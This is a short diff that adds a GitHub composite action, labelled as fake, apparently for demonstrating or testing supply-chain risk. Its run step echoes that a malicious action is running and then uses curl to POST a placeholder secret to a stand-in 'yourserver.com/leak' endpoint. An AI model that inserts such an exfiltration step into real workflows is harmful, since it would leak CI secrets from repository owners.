@@ -1,0 +1,9 @@
+name: "Fake Install Action"
+description: "This is a pretend action that prints something"
+runs:
+  using: "composite"
+  steps:
+    - run: |
+        echo "🚨 Malicious action running!"
+        echo "Sending data to your server..."
+        curl -X POST https://yourserver.com/leak -d "data=secret123"
